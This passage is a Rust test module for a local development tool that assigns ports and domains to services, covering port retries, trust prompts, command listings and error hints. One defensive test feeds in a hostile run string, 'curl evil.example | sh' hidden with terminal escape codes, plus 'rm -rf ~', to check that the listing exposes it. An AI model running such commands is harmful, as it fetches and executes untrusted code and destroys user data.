        let p = &st.projects["shop"];
        assert_eq!(
            p.services.keys().collect::<Vec<_>>(),
            ["api", "db", "docs", "web"]
        );
        assert_eq!(
            p.services["api"],
            with(svc(51234, true), toml::toml! { future = 1 })
        );
        // The port changed; the fields stay.
        assert_eq!(
            p.services["web"],
            with(svc(3000, true), toml::toml! { health = { path = "/up" } })
        );
        assert!(p.services["docs"].is_managed());
        assert!(
            p.services["docs"].extra.is_empty(),
            "a new service has none"
        );
        assert_eq!(
            p.services["db"],
            with(svc(5432, false), toml::toml! { mine = "yes" })
        );
        assert_eq!(synced.services, p.services);

        // Whatever entry a file service replaces keeps its fields, managed or
        // not: an adopted one keeps them too.
        let f = file("shop", None, &[("db", None), ("docs", None)]);
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        assert_eq!(r.adopted, BTreeSet::from(["db".to_string()]));
        apply_plan(&mut st, &f, &r);
        let db = &st.projects["shop"].services["db"];
        assert_eq!(db, &with(svc(5432, true), toml::toml! { mine = "yes" }));
    }

    #[test]
    fn apply_creates_a_missing_project_under_the_files_apex() {
        let mut st = State::default();
        let f = file("shop", Some("shop.acme.lokal"), &[("@", None)]);
        let picker = Picker::new();
        let r = routes(plan_with(&st, &f, &all(&f), &[], &picker).unwrap());
        let synced = apply_plan(&mut st, &f, &r);
        assert_eq!(synced.ready, ["shop.acme.lokal"]);
        let p = &st.projects["shop"];
        assert_eq!(p.domain, "shop.acme.lokal");
        assert!(!p.created_at.is_empty());
        assert_eq!(p.services["@"], svc(50000, true));
        assert_eq!(st.current_project.as_deref(), Some("shop"));
    }

    #[test]
    fn starts_are_normalised_against_the_files_apex() {
        let f = file("shop", None, &[("@", None), ("api", None), ("web", None)]);
        assert_eq!(select_starts(&f, &[]).unwrap(), all(&f));
        let got = select_starts(
            &f,
            &["API".into(), "web.shop.lokal".into(), "shop.lokal".into()],
        )
        .unwrap();
        assert_eq!(
            got,
            BTreeSet::from(["@".into(), "api".into(), "web".into()])
        );
        let e = select_starts(&f, &["docs".into()]).unwrap_err();
        assert_eq!(e.code, crate::error::EXIT_USAGE);
        assert_eq!(e.message, "no service `docs` in /r/lokal.toml");
        assert_eq!(e.hint.as_deref(), Some("its services: @, api, web"));
        assert!(select_starts(&f, &["-x".into()]).is_err());
    }

    #[test]
    fn the_trust_step_needs_a_persons_yes_or_the_flag() {
        use approval::Status::{Approved, Changed, Unapproved};
        for tty in [false, true] {
            // --yes never asks, and always shows what it runs.
            for st in [Approved, Changed, Unapproved] {
                assert_eq!(trust_step(true, st, tty), TrustStep::Yes);
            }
            assert_eq!(trust_step(false, Approved, tty), TrustStep::Approved);
        }
        assert_eq!(trust_step(false, Unapproved, true), TrustStep::Ask);
        assert_eq!(trust_step(false, Changed, true), TrustStep::Ask);
        assert_eq!(
            trust_step(false, Unapproved, false),
            TrustStep::Refuse { changed: false }
        );
        assert_eq!(
            trust_step(false, Changed, false),
            TrustStep::Refuse { changed: true }
        );
    }

    #[test]
    fn the_listing_shows_every_command_as_written() {
        // The SPEC §4.11 example, with an env pair.
        let mut f = file(
            "shop",
            None,
            &[
                ("@", Some(3000)),
                ("api", None),
                ("web", None),
                ("docs", None),
            ],
        );
        let svc = |f: &mut ProjectFile, sub: &str, run: &str| {
            let s = f.services.get_mut(sub).unwrap();
            s.run = run.into();
        };
        svc(&mut f, "@", "npm start");
        svc(&mut f, "api", "cargo run -p api");
        svc(&mut f, "web", "vite --port {port}");
        svc(&mut f, "docs", "mkdocs serve -a 127.0.0.1:{port}");
        f.services.get_mut("api").unwrap().cwd = PathBuf::from("/r/services/api");
        f.services.get_mut("web").unwrap().env = vec![
            ("NODE_ENV".into(), "development".into()),
            ("EMPTY".into(), String::new()),
        ];
        assert_eq!(
            listing(&f),
            format!(
                "/r/lokal.toml runs these commands:\n\
                 \x20 @     npm start\n\
                 \x20 api   {:<32}  in services/api\n\
                 \x20 docs  mkdocs serve -a 127.0.0.1:{{port}}\n\
                 \x20 web   vite --port {{port}}\n\
                 \x20       env NODE_ENV=development\n\
                 \x20       env EMPTY=\n",
                "cargo run -p api"
            )
        );
        // A cwd outside the file's directory is shown as it is; a long
        // command doesn't push `in` past the column.
        let mut f = file("shop", None, &[("a", None), ("b", None)]);
        f.services.get_mut("a").unwrap().cwd = PathBuf::from("/r/../other");
        f.services.get_mut("b").unwrap().cwd = PathBuf::from("/elsewhere");
        f.services.get_mut("b").unwrap().run = "x".repeat(50);
        let l = listing(&f);
        assert!(
            l.contains(&format!("  a  {:<40}  in ../other\n", "run a {port}")),
            "{l}"
        );
        assert!(
            l.contains(&format!("  b  {}  in /elsewhere\n", "x".repeat(50))),
            "{l}"
        );
    }

    /// A file can't make the listing show something other than what runs:
    /// no control character reaches the terminal, and a second line can't
    /// pass for an `env` line.
    #[test]
    fn the_listing_cant_hide_a_command() {
        let mut f = file("shop", None, &[("api", None)]);
        let api = f.services.get_mut("api").unwrap();
        api.run = "curl evil.example | sh\r\x1b[2Knpm start\u{202e}x\nenv X=1 rm -rf ~\n".into();
        api.env = vec![("A\x1b".into(), "1\n2".into())];
        let l = listing(&f);
        assert_eq!(
            l,
            "/r/lokal.toml runs these commands:\n\
             \x20 api  curl evil.example | sh\\r\\u{1b}[2Knpm start\\u{202e}x\n\
             \x20      ↳ env X=1 rm -rf ~\n\
             \x20      env A\\u{1b}=1\n\
             \x20      ↳ 2\n"
        );
        assert!(!l.chars().any(|c| c.is_control() && c != '\n'), "{l:?}");
    }

    #[test]
    fn printable_escapes_what_a_terminal_wouldnt_show() {
        assert_eq!(
            printable("npm start ü → ✓ {port}"),
            "npm start ü → ✓ {port}"
        );
        assert_eq!(printable("a\tb\nc\rd"), "a\\tb\\nc\\rd");
        assert_eq!(
            printable("\x1b\x07\u{7f}\u{85}\u{9b}"),
            "\\u{1b}\\u{7}\\u{7f}\\u{85}\\u{9b}"
        );
        assert_eq!(
            printable("a\u{200b}b\u{202e}c\u{2066}d\u{feff}e\u{ad}f\u{2028}g"),
            "a\\u{200b}b\\u{202e}c\\u{2066}d\\u{feff}e\\u{ad}f\\u{2028}g"
        );
        // A backslash is shown as it is.
        assert_eq!(printable(r"grep 'a\|b'"), r"grep 'a\|b'");
    }

    #[test]
    fn each_start_gets_its_port_the_url_variables_then_the_files_env() {
        let mut f = file("shop", None, &[("api", Some(4000)), ("web", None)]);
        let web = f.services.get_mut("web").unwrap();
        web.env = vec![("NODE_ENV".into(), "development".into())];
        web.cwd = PathBuf::from("/r/web");
        let mut st = State::default();
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        let synced = apply_plan(&mut st, &f, &r);
        let only_web = BTreeSet::from(["web".to_string()]);
        let starts = starts_of(&f, &r, &synced, &only_web);
        assert_eq!(starts.len(), 1, "only what this up starts");
        let w = &starts[0];
        assert_eq!(
            (w.sub.as_str(), w.port, w.run.as_str(), w.cwd.as_path()),
            ("web", 50000, "run web 50000", Path::new("/r/web"))
        );
        // §4.10's variables (every service after the write), then the file's.
        assert_eq!(
            w.env,
            [
                ("PORT", "50000"),
                ("HOST", "127.0.0.1"),
                ("LOKAL_URL", "https://web.shop.lokal"),
                ("LOKAL_URL_API", "https://api.shop.lokal"),
                ("LOKAL_URL_WEB", "https://web.shop.lokal"),
                ("NODE_ENV", "development"),
            ]
            .map(|(k, v)| (k.to_string(), v.to_string()))
        );
        let both = starts_of(&f, &r, &synced, &all(&f));
        assert_eq!(both[0].run, "run api 4000");
        // Only a port from the file is fixed: a retry may move the others.
        assert_eq!((both[0].fixed, both[1].fixed), (true, false));
        assert_eq!(both[1].template, "run web {port}");
    }

    #[test]
    fn a_retry_changes_the_placeholder_and_port_but_not_the_urls() {
        let mut f = file("shop", None, &[("web", None)]);
        f.services.get_mut("web").unwrap().env = vec![("NODE_ENV".into(), "dev".into())];
        let mut st = State::default();
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        let synced = apply_plan(&mut st, &f, &r);
        let first = starts_of(&f, &r, &synced, &all(&f)).remove(0);
        assert_eq!(first.run, "run web 50000");
        let again = first.on_port(51302);
        assert_eq!(
            (again.port, again.run.as_str()),
            (51302, "run web 51302"),
            "{{port}} comes from the run as written"
        );
        let want: Vec<(String, String)> = first
            .env
            .iter()
            .map(|(k, v)| match k.as_str() {
                "PORT" => (k.clone(), "51302".to_string()),
                _ => (k.clone(), v.clone()),
            })
            .collect();
        assert_eq!(again.env, want);
        assert!(
            again
                .env
                .contains(&("LOKAL_URL".into(), "https://web.shop.lokal".into()))
        );
        assert_eq!(
            (&again.sub, &again.template, &again.cwd, again.fixed),
            (&first.sub, &first.template, &first.cwd, first.fixed)
        );
    }

    #[test]
    fn a_retry_moves_only_a_managed_service_that_still_has_its_old_port() {
        let st = state(&[
            (
                "shop",
                "shop.lokal",
                &[
                    ("web", svc(50000, true)),
                    ("moved", svc(50001, true)),
                    ("db", svc(50002, false)),
                ],
            ),
            ("other", "other.lokal", &[("x", svc(50003, false))]),
        ]);
        let picker = Picker::new();
        let mut pick = |t: &BTreeSet<u16>| picker.pick(t);
        let mut moved = st.clone();
        assert_eq!(
            move_port(&mut moved, "shop", "web", 50000, &mut pick).unwrap(),
            // Every port in state is skipped, in any project.
            Some((50004, "web.shop.lokal".to_string()))
        );
        assert_eq!(moved.projects["shop"].services["web"], svc(50004, true));
        let mut want = st.clone();
        want.projects
            .get_mut("shop")
            .unwrap()
            .services
            .insert("web".into(), svc(50004, true));
        assert_eq!(moved, want, "nothing else changes");
        // Changed in the meantime: another port, added by hand, or gone.
        for (project, sub, old) in [
            ("shop", "moved", 50000),
            ("shop", "db", 50002),
            ("shop", "gone", 50000),
            ("nope", "web", 50000),
        ] {
            let mut same = st.clone();
            assert_eq!(
                move_port(&mut same, project, sub, old, &mut pick).unwrap(),
                None,
                "{project} {sub}"
            );
            assert_eq!(same, st, "{project} {sub}");
        }
    }

    #[test]
    fn a_line_says_the_port_is_taken_in_any_case() {
        for yes in [
            "Error: listen EADDRINUSE: address already in use :::51234",
            "OSError: [Errno 48] Address already in use",
            "Error: Address already in use (os error 48)",
            "eaddrinuse",
            "ADDRESS ALREADY IN USE",
        ] {
            assert!(says_port_taken(yes), "{yes}");
        }
        for no in ["", "address in use", "EADDRNOTAVAIL", "already in use"] {
            assert!(!says_port_taken(no), "{no}");
        }
    }

    /// A line said a port is in use: the service's own port counts as taken
    /// only when something outside its process group (50) holds it, seen
    /// by lsof (listening or only bound) or only by a connect (another
    /// user's process).
    #[test]
    fn own_port_taken_only_by_another_process_group() {
        let owner = |pgid, listening| PortOwner {
            pid: pgid + 1,
            pgid,
            name: "node".into(),
            listening,
        };
        // Nothing there.
        assert!(!own_port_taken(false, &[], 50));
        // The service's own processes: they bound it, and failed on another
        // port. Also next to another group's socket.
        assert!(!own_port_taken(true, &[owner(50, true)], 50));
        assert!(!own_port_taken(
            true,
            &[owner(70, false), owner(50, true)],
            50
        ));
        assert!(!own_port_taken(false, &[owner(50, false)], 50));
        // Another group listens, or only holds it without listening.
        assert!(own_port_taken(true, &[owner(70, true)], 50));
        assert!(own_port_taken(false, &[owner(70, false)], 50));
        // A connection, but lsof shows no owner: another user's.
        assert!(own_port_taken(true, &[], 50));
    }

    #[test]
    fn the_port_in_use_hint_points_to_the_debugger_ports_section() {
        assert_eq!(
            port_in_use_hint("w", 53840),
            "w says a port is in use, but its own port 53840 is free. Another port it opens may be \
shared with another service, such as a debugger port (9229): give each server its own. See \
https://mehmetkose.github.io/lokal/docs/guides/frameworks#several-node-or-workers-servers-debugger-ports"
        );
        assert_section_exists(DEBUGGER_PORTS);
    }

    /// The docs page of `link` (`guides/frameworks#anchor`) has a `##`
    /// heading whose slug is the anchor.
    fn assert_section_exists(link: &str) {
        let (page, anchor) = link.split_once('#').unwrap();
        let page = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../website/site/docs")
            .join(page)
            .with_extension("md");
        let text = std::fs::read_to_string(&page).unwrap();
        let slug = |h: &str| {
            h.to_lowercase()
                .chars()
                .filter(|c| c.is_alphanumeric() || *c == ' ' || *c == '-')
                .collect::<String>()
                .split_whitespace()
                .collect::<Vec<_>>()
                .join("-")
        };
        assert!(
            text.lines()
                .filter_map(|l| l.strip_prefix("## "))
                .any(|h| slug(h) == anchor),
            "no heading for #{anchor} in {}",
            page.display()
        );
    }

    fn owner(pid: u32, pgid: u32, name: &str, listening: bool) -> PortOwner {
        PortOwner {
            pid,
            pgid,
            name: name.into(),
            listening,
        }
    }

    /// After an exit 0 the service's group is 50: a holder in it is a
    /// background job lokal still follows; listeners outside it, with none
    /// in it, run outside lokal up; otherwise lokal sees nothing it left.
    #[test]
    fn what_an_exit_0_left_on_the_port_depends_on_the_process_group() {
        assert_eq!(port_left(&[], 50), PortLeft::Nothing);
        assert_eq!(
            port_left(&[owner(51, 50, "node", true)], 50),
            PortLeft::InGroup
        );
        // Its own group binds it, whoever else listens.
        assert_eq!(
            port_left(
                &[owner(70, 70, "node", true), owner(51, 50, "node", false)],
                50
            ),
            PortLeft::InGroup
        );
        // Only the listening ones outside: a bound socket isn't a server.
        assert_eq!(
            port_left(
                &[owner(70, 70, "node", true), owner(80, 80, "x", false)],
                50
            ),
            PortLeft::Outside(vec![owner(70, 70, "node", true)])
        );
        assert_eq!(
            port_left(&[owner(80, 80, "x", false)], 50),
            PortLeft::Nothing
        );
    }

    #[test]
    fn the_exit_line_names_what_the_command_left_and_the_hint_links_the_guide() {
        assert_eq!(
            left_running("web", 9903, &[owner(25898, 25898, "node", true)]),
            "exited 0, and left localhost:9903 to node (pid 25898), which runs outside lokal up: lokal \
logs web won't show its output, and stopping lokal up won't stop it."
        );
        assert_eq!(
            left_running(
                "@",
                3000,
                &[
                    owner(1, 1, "node", true),
                    owner(2, 1, "node", true),
                    owner(3, 3, "x\u{1b}", true)
                ]
            ),
            "exited 0, and left localhost:3000 to node (pid 1), node (pid 2) and x\\u{1b} (pid 3), which \
run outside lokal up: lokal logs @ won't show their output, and stopping lokal up won't stop them."
        );
        assert_eq!(
            detached_hint("web"),
            "web's run must keep its server in the foreground. See \
https://mehmetkose.github.io/lokal/docs/guides/frameworks#servers-that-detach-themselves"
        );
        assert_section_exists(DETACHING);
    }

    /// The ready line keeps its `R/N` prefix, which agents wait for, and
    /// names the services that aren't simply ready after it.
    #[test]
    fn the_ready_line_counts_detached_servers_and_names_the_rest() {
        use Counted::{Detached, NotReady, Ready};
        let took = Duration::from_millis(6500);
        assert_eq!(
            ready_line(&[("api", Ready), ("web", Ready)], took, true),
            "✓ ready: 2/2 services accepting connections (6.5s)"
        );
        assert_eq!(
            ready_line(
                &[
                    ("console", Detached),
                    ("render", Detached),
                    ("web", Detached)
                ],
                took,
                true
            ),
            "✓ ready: 3/3 services accepting connections (6.5s); detached: console, render, web"
        );
        assert_eq!(
            ready_line(
                &[
                    ("api", NotReady(Some(0))),
                    ("db", Ready),
                    ("web", NotReady(Some(1))),
                    ("x", Detached)
                ],
                took,
                true
            ),
            "✓ ready: 2/4 services accepting connections (6.5s); detached: x; not ready: api (exited 0), \
web (exited 1)"
        );
        assert_eq!(
            ready_line(&[("a", Detached), ("b", NotReady(None))], took, false),
            "✓ listening: 1/2 services on localhost; detached: a; not ready: b"
        );
    }

    #[test]
    fn the_last_line_names_each_server_left_running() {
        let one = [("web".to_string(), owner(25898, 25898, "node", true))];
        assert_eq!(
            keep_running_line(&one),
            "1 server keeps running outside lokal up: web (node, pid 25898)"
        );
        let three = [
            ("web".to_string(), owner(1, 1, "node", true)),
            ("web".to_string(), owner(2, 1, "node", true)),
            ("db".to_string(), owner(3, 3, "postgres", true)),
        ];
        assert_eq!(
            keep_running_line(&three),
            "3 servers keep running outside lokal up: web (node, pid 1), web (node, pid 2), db (postgres, \
pid 3)"
        );
    }

    #[test]
    fn the_record_keeps_what_other_services_left() {
        let d = |sub: &str, port, pid| Detached {
            sub: sub.into(),
            port,
            pid,
            name: "node".into(),
        };
        let mut record = vec![d("web", 9903, 1), d("api", 9904, 2)];
        // web left two servers this time: they replace what it left before.
        add_detached(
            &mut record,
            "web",
            9903,
            &[owner(5, 5, "node", true), owner(6, 5, "node", true)],
        );
        assert_eq!(
            record,
            [d("api", 9904, 2), d("web", 9903, 5), d("web", 9903, 6)]
        );
        // An up that starts web forgets what web left; api's stays.
        forget_detached(&mut record, &BTreeSet::from(["web".to_string()]));
        assert_eq!(record, [d("api", 9904, 2)]);
        // It's JSON, and a field this lokal doesn't know makes no difference.
        let json = serde_json::to_string(&record).unwrap();
        assert_eq!(json, r#"[{"sub":"api","port":9904,"pid":2,"name":"node"}]"#);
        let newer = r#"[{"sub":"api","port":9904,"pid":2,"name":"node","since":"x"}]"#;
        assert_eq!(
            serde_json::from_str::<Vec<Detached>>(newer).unwrap(),
            record
        );
    }

    /// The busy-port error names a server as left by an earlier `up` only
    /// when the pid and the full command name the record has for that port
    /// still listen there: never from the record alone.
    #[test]
    fn the_busy_error_names_what_the_last_up_left_running() {
        let f = file("shop", None, &[("web", Some(9903)), ("api", None)]);
        let busy = |sub: &str, port, from| Busy {
            sub: sub.into(),
            port,
            from,
        };
        let record = [Detached {
            sub: "web".into(),
            port: 9903,
            pid: 25898,
            name: "node-the-long-name".into(),
        }];
        let held = [owner(25898, 25898, "node-the-long-name", true)];
        let e = busy_error(&f, &busy("web", 9903, PortFrom::File), &held, &record);
        assert_eq!(
            e.message,
            "localhost:9903 is already in use by node-the- (pid 25898), which web left running at the last \
lokal up; not starting web"
        );
        assert_eq!(
            e.hint.as_deref(),
            Some(
                "stop it: kill 25898. web's run must keep its server in the foreground. See \
https://mehmetkose.github.io/lokal/docs/guides/frameworks#servers-that-detach-themselves"
            )
        );
        // Another service now has the port: still web's server.
        let e = busy_error(&f, &busy("api", 9903, PortFrom::Kept), &held, &record);
        assert!(
            e.message
                .ends_with("which web left running at the last lokal up; not starting api"),
            "{}",
            e.message
        );
        // Another pid, another name, only bound, or another port: the
        // usual error.
        let usual = "localhost:9903 is already in use by node (pid 25898); not starting web";
        for (owners, port) in [
            (vec![owner(25899, 1, "node-the-long-name", true)], 9903),
            (vec![owner(25898, 1, "node", true)], 9903),
            (vec![owner(25898, 1, "node-the-long-name", false)], 9903),
            (held.to_vec(), 9904),
        ] {
            let e = busy_error(&f, &busy("web", port, PortFrom::File), &owners, &record);
            assert!(!e.message.contains("left running"), "{}", e.message);
            assert_eq!(
                e.hint.as_deref(),
                Some(&*format!(
                    "stop that server, or change port for web in {PROJECT_FILE}"
                ))
            );
        }
        let e = busy_error(
            &f,
            &busy("web", 9903, PortFrom::File),
            &[owner(25898, 1, "node", true)],
            &[],
        );
        assert_eq!(e.message, usual);
    }

    #[test]
    fn the_wrong_port_hint_names_the_files_port_and_maybe_the_placeholder() {
        let job = |sub: &str, template: &str| Start {
            sub: sub.into(),
            port: 51234,
            template: template.into(),
            run: runner::substitute_port(template, 51234),
            cwd: PathBuf::from("/r"),
            env: vec![],
            fixed: false,
        };
        // One candidate: the SPEC §4.11 example.
        assert_eq!(
            wrong_port_hint(&job("web", "vite"), &[5173]),
            "web listens on localhost:5173, not 51234. Set port = 5173 for web in lokal.toml, \
or put {port} in its run: vite --port {port}"
        );
        // No second suggestion once the run has `{port}`.
        assert_eq!(
            wrong_port_hint(&job("@", "npm start -- -p {port} # x"), &[3000]),
            "@ listens on localhost:3000, not 51234. Set port = 3000 for @ in lokal.toml"
        );
        // The run as the trust listing shows it.
        assert!(
            wrong_port_hint(&job("a", "x\u{1b}[2K"), &[1])
                .ends_with("its run: x\\u{1b}[2K --port {port}")
        );
    }

    /// Regression: with several listeners the hint offered the lowest, which
    /// for Astro on Cloudflare's Vite plugin is Miniflare's inspector port.
    /// Now it lists them (three, then how many more) and offers none.
    #[test]
    fn the_wrong_port_hint_offers_no_port_when_there_are_several() {
        let job = Start {
            sub: "render".into(),
            port: 51234,
            template: "pnpm dev".into(),
            run: "pnpm dev".into(),
            cwd: PathBuf::from("/r"),
            env: vec![],
            fixed: false,
        };
        assert_eq!(
            wrong_port_hint(&job, &[9912, 56671, 56692, 56722, 56723, 56724]),
            "render listens on localhost:9912, localhost:56671, localhost:56692 and 3 more ports, \
not 51234. If one of them is its server, set port to it for render in lokal.toml, or put {port} in its \
run: pnpm dev --port {port}"
        );
        let job = Start {
            template: "npm start -- -p {port}".into(),
            ..job
        };
        assert_eq!(
            wrong_port_hint(&job, &[3000, 24678]),
            "render listens on localhost:3000 and localhost:24678, not 51234. If one of them is its \
server, set port to it for render in lokal.toml"
        );
    }

    /// The file fixes the port: the hint never offers another `port =`, with
    /// one candidate or several.
    #[test]
    fn the_wrong_port_hint_never_replaces_a_fixed_port() {
        let job = Start {
            sub: "render".into(),
            port: 9902,
            template: "pnpm dev".into(),
            run: "pnpm dev".into(),
            cwd: PathBuf::from("/r"),
            env: vec![],
            fixed: true,
        };
        assert_eq!(
            wrong_port_hint(&job, &[9912, 56671, 56692, 56722, 56723, 56724]),
            "render isn't listening on 9902, the port lokal.toml gives it (it listens on localhost:9912, \
localhost:56671, localhost:56692 and 3 more ports). Make its server listen on 9902, or put {port} in its \
run: pnpm dev --port {port}"
        );
        let job = Start {
            template: "vite --port {port}".into(),
            ..job
        };
        assert_eq!(
            wrong_port_hint(&job, &[5173]),
            "render isn't listening on 9902, the port lokal.toml gives it (it listens on localhost:5173). \
Make its server listen on 9902"
        );
    }

    #[test]
    fn a_line_loses_its_ending_and_invalid_utf8_but_not_a_split_character() {
        let mut carry = vec![];
        assert_eq!(take_line(b"hello\n", false, &mut carry), "hello");
        assert_eq!(take_line(b"crlf\r\n", false, &mut carry), "crlf");
        // A lone \r (a progress bar) stays.
        assert_eq!(take_line(b"a\rb\n", false, &mut carry), "a\rb");
        assert_eq!(take_line(b"bad \xff\n", false, &mut carry), "bad \u{fffd}");
        // The last line, with no line break before EOF.
        assert_eq!(take_line(b"last", false, &mut carry), "last");
        assert!(carry.is_empty());
        // Split inside `é` (c3 a9): the cut byte starts the next piece.
        assert_eq!(take_line(b"caf\xc3", true, &mut carry), "caf");
        assert_eq!(carry, b"\xc3");
        assert_eq!(take_line(b"\xa9!\n", false, &mut carry), "é!");
        assert!(carry.is_empty());
        let crab = "🦀".as_bytes();
        assert_eq!(take_line(&[b'x', crab[0], crab[1]], true, &mut carry), "x");
        assert_eq!(
            take_line(&[crab[2], crab[3], b'\n'], false, &mut carry),
            "🦀"
        );
        // A split after a whole character carries nothing.
        assert_eq!(take_line("ab€".as_bytes(), true, &mut carry), "ab€");
        assert!(carry.is_empty());
    }

    #[test]
    fn an_incomplete_tail_is_a_lead_byte_without_its_continuations() {
        assert_eq!(incomplete_tail(b""), 0);
        assert_eq!(incomplete_tail(b"abc"), 0);
        assert_eq!(incomplete_tail("é€🦀".as_bytes()), 0);
        assert_eq!(incomplete_tail(b"a\xc3"), 1);
        assert_eq!(incomplete_tail(b"a\xe2\x82"), 2);
        assert_eq!(incomplete_tail(b"a\xf0\x9f\xa6"), 3);
        // Stray continuation bytes are nothing to wait for.
        assert_eq!(incomplete_tail(b"\x80\x80\x80\x80\x80"), 0);
        assert_eq!(incomplete_tail(b"\xff"), 0);
    }

    #[test]
    fn down_removes_only_managed_services() {
        let mut st = state(&[(
            "shop",
            "shop.lokal",
            &[
                ("api", svc(51234, true)),
                ("web", svc(51240, true)),
                ("db", svc(5432, false)),
            ],
        )]);
        st.current_project = Some("shop".into());
        assert_eq!(remove_managed(&mut st, "nope", true), Removal::NoProject);
        // --remove-project keeps a project that still has hand-added services.
        assert_eq!(
            remove_managed(&mut st, "shop", true),
            Removal::Removed {
                domain: "shop.lokal".into(),
                subs: vec!["api".into(), "web".into()],
                gone: vec!["api.shop.lokal".into(), "web.shop.lokal".into()],
                project_removed: false,
                kept: vec!["db".into()],
            }
        );
        assert_eq!(
            st.projects["shop"].services.keys().collect::<Vec<_>>(),
            ["db"]
        );
        // Nothing left to do: say so.
        let before = st.clone();
        assert_eq!(
            remove_managed(&mut st, "shop", false),
            Removal::Nothing {
                kept: vec!["db".into()]
            }
        );
        assert_eq!(st, before);
    }

    #[test]
    fn down_can_remove_the_project_when_nothing_else_is_left() {
        let mut st = state(&[
            ("shop", "shop.lokal", &[("api", svc(51234, true))]),
            ("other", "other.lokal", &[]),
        ]);
        st.current_project = Some("shop".into());
        let r = remove_managed(&mut st, "shop", true);
        assert!(
            matches!(
                r,
                Removal::Removed {
                    project_removed: true,
                    ..
                }
            ),
            "{r:?}"
        );
        assert!(!st.projects.contains_key("shop"));
        assert_eq!(st.current_project, None);
        // An empty project goes too; the current project stays if it's another.
        let mut st = state(&[("shop", "shop.lokal", &[]), ("other", "other.lokal", &[])]);
        st.current_project = Some("other".into());
        let r = remove_managed(&mut st, "shop", true);
        assert!(
            matches!(&r, Removal::Removed { project_removed: true, subs, .. } if subs.is_empty()),
            "{r:?}"
        );
        assert_eq!(st.current_project.as_deref(), Some("other"));
        // Without the flag, an empty project is nothing to do.
        let mut st = state(&[("shop", "shop.lokal", &[])]);
        assert_eq!(
            remove_managed(&mut st, "shop", false),
            Removal::Nothing { kept: vec![] }
        );
    }
}
